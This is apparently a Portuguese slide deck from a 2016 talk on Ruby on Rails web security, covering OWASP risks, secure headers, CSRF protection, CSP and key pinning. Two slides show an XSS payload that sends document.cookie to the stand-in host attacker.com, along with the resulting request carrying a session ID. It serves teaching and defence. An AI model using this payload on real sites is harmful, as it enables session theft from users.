<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="generator" content="pandoc">
  <meta name="author" content="Segurança de aplicações web" />
  <title>Sopa de letrinhas</title>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <link rel="stylesheet" href="../reveal.js/css/reveal.min.css"/>
    <style type="text/css">code{white-space: pre;}</style>
    <link rel="stylesheet" href="../reveal.js/lib/css/solarized_dark.css"/>
    <link rel="stylesheet" href="../reveal.js/css/theme/night.css"/>
    <!-- If the query includes 'print-pdf', include the PDF print sheet -->
    <script>
      if( window.location.search.match( /print-pdf/gi ) ) {
        var link = document.createElement( 'link' );
        link.rel = 'stylesheet';
        link.type = 'text/css';
        link.href = '../reveal.js/css/print/pdf.css';
        document.getElementsByTagName( 'head' )[0].appendChild( link );
      }
    </script>
    <!--[if lt IE 9]>
    <script src="../reveal.js/lib/js/html5shiv.js"></script>
    <![endif]-->
</head>
<body>
  <div class="reveal">
    <div class="slides">

<section>
    <h1 class="title">Sopa de letrinhas</h1>
    <h2 class="author">Segurança de aplicações web</h2>
    <h3 class="date">Jonhnny Weslley - <span class="citation" data-cites="jweslley">@jweslley</span></h3>
</section>

<section id="whoami" class="slide level2">
<h1>whoami</h1>
<ul>
<li>Jonhnny Weslley</li>
<li><span class="citation" data-cites="jweslley">@jweslley</span></li>
<li><a href="">http://www.jonhnnyweslley.net</a></li>
</ul>
<figure>
<img src="../profile_qrcode.png" alt="" />
</figure>
</section>
<section id="esclarecimento" class="slide level2">
<h1>Esclarecimento</h1>
</section>
<section><section id="roteiro" class="titleslide slide level1"><h1>Roteiro</h1></section><section id="roteiro-1" class="slide level2">
<h1>Roteiro</h1>
<ul>
<li>Top 10 vunerabilidades segundo OWASP
<ul>
<li><a href="https://www.owasp.org/">Open Web Application Security Project - https://www.owasp.org</a></li>
</ul></li>
</ul>
</section><section id="roteiro-2" class="slide level2">
<h1>Roteiro</h1>
<h3 id="top-10-vunerabilidades-segundo-owasp">Top 10 vunerabilidades segundo OWASP</h3>
<ol type="1">
<li>Injection
<ul>
<li>SQL Injection, XSS, CSS Injection, ...</li>
</ul></li>
<li>Sessions and Cookies</li>
<li>XSS (Cross-Site Scripting)</li>
<li>Authorization</li>
<li>Security Misconfiguration</li>
<li>Sensitive Data Transmission</li>
<li>Missing Function Level Access Control</li>
<li>Cross-Site Request Forgery (CSRF)</li>
<li>Using Components with Known Vulnerabilities</li>
<li>Unvalidated Redirects and Forwards</li>
</ol>
</section></section>
<section><section id="ruby-on-rails" class="titleslide slide level1"><h1>Ruby On Rails</h1></section><section id="ruby-on" class="slide level2">
<h1>Ruby On</h1>
<figure>
<img src="images/railslogo.png" alt="" />
</figure>
</section><section id="ruby-on-rails-1" class="slide level2">
<h1>Ruby On Rails</h1>
<ul>
<li><a href="http://guides.rubyonrails.org/security.html">The official Ruby on Rails security guide</a></li>
<li>Bons valores padrões</li>
</ul>
</section><section id="section" class="slide level2">
<h1></h1>
<figure>
<img src="images/securityheaders.png" alt="securityheaders.io" /><figcaption>securityheaders.io</figcaption>
</figure>
</section><section id="section-1" class="slide level2">
<h1></h1>
<figure>
<img src="images/sfd-rails-defaults.png" alt="Secure headers" /><figcaption>Secure headers</figcaption>
</figure>
</section><section id="default-headers" class="slide level2">
<h1>Default headers</h1>
<pre><code>config.action_dispatch.default_headers = {
  &#39;X-Frame-Options&#39; =&gt; &#39;SAMEORIGIN&#39;,
  &#39;X-XSS-Protection&#39; =&gt; &#39;1; mode=block&#39;,
  &#39;X-Content-Type-Options&#39; =&gt; &#39;nosniff&#39;
}</code></pre>
</section><section id="x-frame-options" class="slide level2">
<h1>X-Frame-Options</h1>
<ul>
<li>Previne Clickjacking</li>
<li>Valores possiveis:
<ul>
<li>SAMEORIGIN</li>
<li>DENY</li>
<li>ALLOW-FROM https://example.com</li>
</ul></li>
<li><a href="https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/">Exemplo</a></li>
</ul>
</section><section id="x-xss-protection" class="slide level2">
<h1>X-XSS-Protection</h1>
</section><section id="cross-site-scripting-xss" class="slide level2">
<h1>Cross-Site Scripting (XSS)</h1>
</section><section id="confiar-no-conteudo-fornecido-pelo-usuario" class="slide level2">
<h1>Confiar no conteudo fornecido pelo usuario?</h1>
</section><section id="section-2" class="slide level2">
<h1></h1>
<figure>
<img src="images/grumpy-cat-no-1.jpg" alt="" />
</figure>
</section><section id="section-3" class="slide level2">
<h1></h1>
<p>Conteudo malicioso:</p>
<pre><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://www.attacker.com/&#39; + document.cookie + &#39;&quot;&gt;&#39;);&lt;/script&gt;</code></pre>
<p>Servidor do mal:</p>
<pre><code>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</code></pre>
</section><section id="contra-medidas" class="slide level2">
<h1>Contra-medidas</h1>
<ul>
<li><a href="http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html">Sanitizacao de dados</a>
<ul>
<li><code>strip_tags</code>, <code>strip_links</code>, <code>sanitize</code></li>
</ul></li>
</ul>
<pre><code>strip_tags(&quot;some&lt;&lt;b&gt;script&gt;alert(&#39;hello&#39;)&lt;&lt;/b&gt;/script&gt;&quot;)</code></pre>
<pre><code>strip_links(&#39;Please e-mail me at &lt;a href=&quot;mailto:me@email.com&quot;&gt;me@email.com&lt;/a&gt;.&#39;)</code></pre>
<pre><code>tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))</code></pre>
</section><section id="cookies" class="slide level2">
<h1>Cookies</h1>
<ul>
<li>Como funciona HTTP?</li>
<li>Permite identificar usuario.</li>
<li>Propriedades
<ul>
<li>HTTP-only</li>
<li>Secure</li>
</ul></li>
</ul>
</section><section id="cookies-1" class="slide level2">
<h1>Cookies</h1>
<pre><code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://www.attacker.com/&#39; + document.cookie + &#39;&quot;&gt;&#39;);&lt;/script&gt;</code></pre>
</section><section id="cookies-2" class="slide level2">
<h1>Cookies</h1>
<figure>
<img src="images/sfd-rails-secure.png" alt="config.force_ssl = true" /><figcaption>config.force_ssl = true</figcaption>
</figure>
</section><section id="cookies-on-rails" class="slide level2">
<h1>Cookies on Rails</h1>
<ul>
<li>Criptografados</li>
<li>HTTP-only</li>
<li>Use SSL e <code>force_ssl</code></li>
</ul>
</section><section id="cross-site-request-forgery-csrf" class="slide level2">
<h1>Cross-Site Request Forgery (CSRF)</h1>
</section><section id="section-4" class="slide level2">
<h1></h1>
<figure>
<img src="images/csrf.png" alt="Cross-Site Request Forgery (CSRF)" /><figcaption>Cross-Site Request Forgery (CSRF)</figcaption>
</figure>
</section><section id="ruby-on-rails-2" class="slide level2">
<h1>Ruby On Rails</h1>
<p>app/controllers/application_controller.rb</p>
<pre><code>class ApplicationController &lt; ActionController::Base
  protect_from_forgery with: :exception
end</code></pre>
</section><section id="content-security-policy-csp" class="slide level2">
<h1>Content Security Policy (CSP)</h1>
<ul>
<li>Define quais recursos podem ser baixados, carregados e/ou executados.</li>
<li>Bastante efetivo para reduzir vetores de ataques XSS.</li>
</ul>
<pre><code>Content-Security-Policy: default-src &#39;self&#39;;</code></pre>
</section><section id="section-5" class="slide level2">
<h1></h1>
<figure>
<img src="images/github.png" alt="GitHub" /><figcaption>GitHub</figcaption>
</figure>
</section><section id="github" class="slide level2">
<h1>GitHub</h1>
<ul>
<li>default-src 'none';</li>
<li>base-uri 'self';</li>
<li>connect-src 'self' uploads.github.com status.github.com api.github.com www.google-analytics.com github-cloud.s3.amazonaws.com wss://live.github.com;</li>
<li>script-src assets-cdn.github.com;</li>
<li>style-src 'unsafe-inline' assets-cdn.github.com</li>
<li>font-src assets-cdn.github.com;</li>
<li>form-action 'self' github.com gist.github.com;</li>
<li>frame-ancestors 'none';</li>
<li>frame-src render.githubusercontent.com;</li>
<li>img-src 'self' data: assets-cdn.github.com identicons.github.com ...</li>
<li>media-src 'none'; object-src assets-cdn.github.com;</li>
<li>plugin-types application/x-shockwave-flash;</li>
</ul>
</section><section id="facilitando" class="slide level2">
<h1>Facilitando</h1>
<ul>
<li>Usar gem <a href="https://github.com/twitter/secureheaders">secureheaders</a></li>
</ul>
<pre><code>SecureHeaders::Configuration.default do |config|
  config.csp = {
    report_only: Rails.env.production?,
    preserve_schemes: true, # default: false.
    default_src: %w(*),
    script_src: %w(&#39;self&#39; https://ajax.googleapis.com https://www.google-analytics.com),
    connect_src: %w(&#39;self&#39;),
    style_src: %w(&#39;self&#39; &#39;unsafe-inline&#39;),
    report_uri: [&quot;/csp_report?report_only=#{Rails.env.production?}&quot;]
  }
end</code></pre>
</section><section id="http-public-key-pinning-hpkp" class="slide level2">
<h1>HTTP Public Key Pinning (HPKP)</h1>
<ul>
<li>Mecanismo que previne ataques man-in-the-middle.</li>
</ul>
<pre><code>Public-Key-Pins:
  pin-sha256=&quot;Q0ig6URMeMsmXgWNXolEtNhPlmK9Jtslf4k0pEPHAWE=&quot;;
  pin-sha256=&quot;F5OSegYUVJeJrc4vjzT38LZtDzrjo7hNIewV27pPrcc=&quot;;
  pin-sha256=&quot;p1Uk2ryJ7QmI5/zIzFmdzme0X+2nvXG5bHwR88A5ZjA=&quot;;
  max-age=31536000; includeSubDomains</code></pre>
</section><section id="http-public-key-pinning-hpkp-1" class="slide level2">
<h1>HTTP Public Key Pinning (HPKP)</h1>
<figure>
<img src="images/hpkp2.png" alt="" />
</figure>
</section><section id="resumindo" class="slide level2">
<h1>Resumindo</h1>
<ul>
<li>Use SSL</li>
<li>Esteja ciente dos vetores de ataques</li>
<li><a href="http://blog.codeclimate.com/blog/2013/03/27/rails-insecure-defaults/">Não existe solução bala-de-prata</a></li>
</ul>
</section></section>
<section><section id="obrigado" class="titleslide slide level1"><h1>Obrigado!</h1></section><section id="referências" class="slide level2">
<h1>Referências</h1>
<ul>
<li><a href="https://www.owasp.org/">Open Web Application Security Project (OWASP)</a></li>
<li><a href="https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet">OWASP Top Ten Cheat Sheet</a></li>
<li><a href="http://guides.rubyonrails.org/security.html">The official Ruby on Rails security guide</a></li>
<li><a href="https://rorsecurity.info/">Ruby on Rails Security Project</a></li>
<li><a href="http://rails-sqli.org/">Rails SQL Injection</a></li>
<li><a href="http://blog.codeclimate.com/blog/2013/03/27/rails-insecure-defaults/">Rails' Insecure Defaults</a></li>
<li><a href="http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/">A Gentle Introduction to Cross-Site Scripting (XSS)</a></li>
<li><a href="https://blog.codeship.com/how-to-get-started-with-a-content-security-policy/">How to Get Started with a Content Security Policy</a></li>
<li><a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">Certificate and Public Key Pinning</a></li>
</ul>
</section><section id="sopa-de-letrinhas" class="slide level2">
<h1>Sopa de letrinhas</h1>
<h3 id="segurança-de-aplicações-web">Segurança de aplicações web</h3>
<ul>
<li>Software Freedom Day 2016 - Teresina</li>
<li>Jonhnny Weslley</li>
<li><span class="citation" data-cites="jweslley">@jweslley</span></li>
<li><a href="">http://jweslley.github.io/talks/sfd-2016-teresina-seguranca</a></li>
</ul>
</section></section>
    </div>
  </div>


  <script src="../reveal.js/lib/js/head.min.js"></script>
  <script src="../reveal.js/js/reveal.min.js"></script>

  <script>

      // Full list of configuration options available here:
      // https://github.com/hakimel/reveal.js#configuration
      Reveal.initialize({
        controls: true,
        progress: true,
        history: true,
        center: true,
        theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
        transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none

        // Optional libraries used to extend on reveal.js
        dependencies: [
          { src: '../reveal.js/lib/js/classList.js', condition: function() { return !document.body.classList; } },
          { src: '../reveal.js/plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
          { src: '../reveal.js/plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } },
					{ src: '../reveal.js/plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
//          { src: '../reveal.js/plugin/search/search.js', async: true, condition: function() { return !!document.body.classList; }, }
//          { src: '../reveal.js/plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
]});
    </script>
    </body>
</html>
